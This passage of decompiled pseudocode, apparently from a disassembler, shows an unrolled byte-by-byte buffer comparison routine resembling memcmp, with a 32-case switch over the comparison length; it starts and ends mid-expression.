(iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 2);\n        uVar2 = *(arg_ch + 2);\n    }\n    else {\n        if (arg_10h != 4) {\ncode_r0x0041332d:\n    // switch table (32 cases) at 0x41447b\n            switch(arg_10h) {\n            case 0:\n                break;\n            case 1:\n                goto code_r0x00413b0e;\n            case 2:\n                goto code_r0x00413f1a;\n            case 3:\n                goto code_r0x0041433b;\n            case 4:\n                goto code_r0x0041369f;\n            case 5:\n                goto code_r0x00413a7f;\n            case 6:\n                goto code_r0x00413e8b;\n            case 7:\n                goto code_r0x004142ac;\n            case 8:\n                goto code_r0x00413610;\n            case 9:\n                goto code_r0x004139ef;\n            case 10:\n                goto code_r0x00413dfb;\n            case 0xb:\n                goto code_r0x0041421d;\n            case 0xc:\n                goto code_r0x00413580;\n            case 0xd:\n                goto code_r0x00413960;\n            case 0xe:\n                goto code_r0x00413d6c;\n            case 0xf:\n                goto code_r0x0041418d;\n            case 0x10:\n                goto code_r0x004134f1;\n            case 0x11:\n                goto code_r0x004138d1;\n            case 0x12:\n                goto code_r0x00413cdd;\n            case 0x13:\n                goto code_r0x004140fe;\n            case 0x14:\n                goto code_r0x00413462;\n            case 0x15:\n                goto code_r0x00413842;\n            case 0x16:\n                goto code_r0x00413c4e;\n            case 0x17:\n                goto code_r0x0041406f;\n            case 0x1a:\n                goto code_r0x00413bbf;\n            case 0x1b:\n                goto code_r0x00413fe0;\n            case 0x1c:\n                uVar1 = *(arg_8h + arg_10h + -0x1c);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1c)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1c);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1b);\n                    uVar1 = *(arg_ch + arg_10h + -0x1b);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1a);\n                    uVar1 = *(arg_ch + arg_10h + -0x1a);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n            case 0x18:\n                uVar1 = *(arg_8h + arg_10h + -0x18);\n                if (uVar1 == *(arg_ch + arg_10h + -0x18)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x18);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x17);\n                    uVar1 = *(arg_ch + arg_10h + -0x17);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x16);\n                    uVar1 = *(arg_ch + arg_10h + -0x16);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413462:\n                uVar1 = *(arg_8h + arg_10h + -0x14);\n                if (uVar1 == *(arg_ch + arg_10h + -0x14)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x14);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x13);\n                    uVar1 = *(arg_ch + arg_10h + -0x13);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x12);\n                    uVar1 = *(arg_ch + arg_10h + -0x12);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x004134f1:\n                uVar1 = *(arg_8h + arg_10h + -0x10);\n                if (uVar1 == *(arg_ch + arg_10h + -0x10)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x10);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xf);\n                    uVar1 = *(arg_ch + arg_10h + -0xf);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xe);\n                    uVar1 = *(arg_ch + arg_10h + -0xe);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413580:\n                if (*(arg_8h + arg_10h + -0xc) == *(arg_ch + arg_10h + -0xc)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -0xc);\n                    uVar2 = *(arg_8h + arg_10h + -0xc);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xb);\n                    uVar1 = *(arg_ch + arg_10h + -0xb);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -10);\n                    uVar1 = *(arg_ch + arg_10h + -10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413610:\n                uVar1 = *(arg_8h + arg_10h + -8);\n                if (uVar1 == *(arg_ch + arg_10h + -8)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -8);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -7);\n                    uVar1 = *(arg_ch + arg_10h + -7);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -6);\n                    uVar1 = *(arg_ch + arg_10h + -6);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0041369f:\n                uVar1 = *(arg_8h + arg_10h + -4);\n                if (uVar1 == *(arg_ch + arg_10h + -4)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -4);\n                    if ((uVar1 == uVar2) || (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 == 0)) {\n                        uVar2 = *(arg_8h + arg_10h + -3);\n                        uVar1 = *(arg_ch + arg_10h + -3);\n                        if ((uVar2 == uVar1) || (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 == 0))\n                        {\n                            uVar2 = *(arg_8h + arg_10h + -2);\n                            uVar1 = *(arg_ch + arg_10h + -2);\n                            if (((uVar2 == uVar1) ||\n                                (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 == 0)) &&\n                               (iVar3 = *(arg_8h + arg_10h + -1) - *(arg_ch + arg_10h + -1),  iVar3 != 0)) {\n                                iVar3 = (0 < iVar3) * 2 + -1;\n                            }\n                        }\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n                break;\n            case 0x1d:\n                uVar1 = *(arg_8h + arg_10h + -0x1d);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1d)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1d);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1c);\n                    uVar1 = *(arg_ch + arg_10h + -0x1c);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1b);\n                    uVar1 = *(arg_ch + arg_10h + -0x1b);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\n            case 0x19:\n                uVar1 = *(arg_8h + arg_10h + -0x19);\n                if (uVar1 == *(arg_ch + arg_10h + -0x19)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x19);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x18);\n                    uVar1 = *(arg_ch + arg_10h + -0x18);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x17);\n                    uVar1 = *(arg_ch + arg_10h + -0x17);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413842:\n                uVar1 = *(arg_8h + arg_10h + -0x15);\n                if (uVar1 == *(arg_ch + arg_10h + -0x15)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x15);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x14);\n                    uVar1 = *(arg_ch + arg_10h + -0x14);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x13);\n                    uVar1 = *(arg_ch + arg_10h + -0x13);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x004138d1:\n                uVar1 = *(arg_8h + arg_10h + -0x11);\n                if (uVar1 == *(arg_ch + arg_10h + -0x11)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x11);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x10);\n                    uVar1 = *(arg_ch + arg_10h + -0x10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xf);\n                    uVar1 = *(arg_ch + arg_10h + -0xf);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413960:\n                uVar1 = *(arg_8h + arg_10h + -0xd);\n                if (uVar1 == *(arg_ch + arg_10h + -0xd)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0xd);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xc);\n                    uVar1 = *(arg_ch + arg_10h + -0xc);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xb);\n                    uVar1 = *(arg_ch + arg_10h + -0xb);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x004139ef:\n                if (*(arg_8h + arg_10h + -9) == *(arg_ch + arg_10h + -9)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -9);\n                    uVar2 = *(arg_8h + arg_10h + -9);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -8);\n                    uVar1 = *(arg_ch + arg_10h + -8);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -7);\n                    uVar1 = *(arg_ch + arg_10h + -7);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413a7f:\n                uVar1 = *(arg_8h + arg_10h + -5);\n                if (uVar1 == *(arg_ch + arg_10h + -5)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -5);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -4);\n                    uVar1 = *(arg_ch + arg_10h + -4);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -3);\n                    uVar1 = *(arg_ch + arg_10h + -3);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\njoined_r0x00413b08:\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413b0e:\n                uVar2 = *(arg_ch + arg_10h + -1);\n                uVar1 = *(arg_8h + arg_10h + -1);\n                if (uVar1 == uVar2) {\n                    return 0;\n                }\n                return (0 < uVar1 - uVar2) * 2 + -1;\n            case 0x1e:\n                uVar1 = *(arg_8h + arg_10h + -0x1e);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1e)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1e);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1d);\n                    uVar1 = *(arg_ch + arg_10h + -0x1d);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x1c);\n                    uVar1 = *(arg_ch + arg_10h + -0x1c);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413bbf:\n                uVar1 = *(arg_8h + arg_10h + -0x1a);\n                if (uVar1 == *(arg_ch + arg_10h + -0x1a)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x1a);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x19);\n                    uVar1 = *(arg_ch + arg_10h + -0x19);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x18);\n                    uVar1 = *(arg_ch + arg_10h + -0x18);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413c4e:\n                uVar1 = *(arg_8h + arg_10h + -0x16);\n                if (uVar1 == *(arg_ch + arg_10h + -0x16)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x16);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x15);\n                    uVar1 = *(arg_ch + arg_10h + -0x15);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x14);\n                    uVar1 = *(arg_ch + arg_10h + -0x14);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413cdd:\n                uVar1 = *(arg_8h + arg_10h + -0x12);\n                if (uVar1 == *(arg_ch + arg_10h + -0x12)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0x12);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x11);\n                    uVar1 = *(arg_ch + arg_10h + -0x11);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0x10);\n                    uVar1 = *(arg_ch + arg_10h + -0x10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413d6c:\n                uVar1 = *(arg_8h + arg_10h + -0xe);\n                if (uVar1 == *(arg_ch + arg_10h + -0xe)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -0xe);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xd);\n                    uVar1 = *(arg_ch + arg_10h + -0xd);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -0xc);\n                    uVar1 = *(arg_ch + arg_10h + -0xc);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413dfb:\n                if (*(arg_8h + arg_10h + -10) == *(arg_ch + arg_10h + -10)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -10);\n                    uVar2 = *(arg_8h + arg_10h + -10);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar1 = *(arg_ch + arg_10h + -9);\n                    uVar2 = *(arg_8h + arg_10h + -9);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar1 = *(arg_ch + arg_10h + -8);\n                    uVar2 = *(arg_8h + arg_10h + -8);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413e8b:\n                uVar1 = *(arg_8h + arg_10h + -6);\n                if (uVar1 == *(arg_ch + arg_10h + -6)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -6);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -5);\n                    uVar1 = *(arg_ch + arg_10h + -5);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -4);\n                    uVar1 = *(arg_ch + arg_10h + -4);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x00413f1a:\n                if (*(arg_8h + arg_10h + -2) != *(arg_ch + arg_10h + -2)) {\ncode_r0x00413f28:\n                    uVar1 = *(arg_ch + arg_10h + -2);\n                    uVar2 = *(arg_8h + arg_10h + -2);\n                    if (uVar2 == uVar1) goto code_r0x00413b0e;\n                    iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1;\n                    goto joined_r0x00413b08;\n                }\n                break;\n            case 0x1f:\n                if (*(arg_8h + arg_10h + -0x1f) == *(arg_ch + arg_10h + -0x1f)) {\n                    iVar3 = 0;\n                }\n                else {\n                    uVar1 = *(arg_ch + arg_10h + -0x1f);\n                    uVar2 = *(arg_8h + arg_10h + -0x1f);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 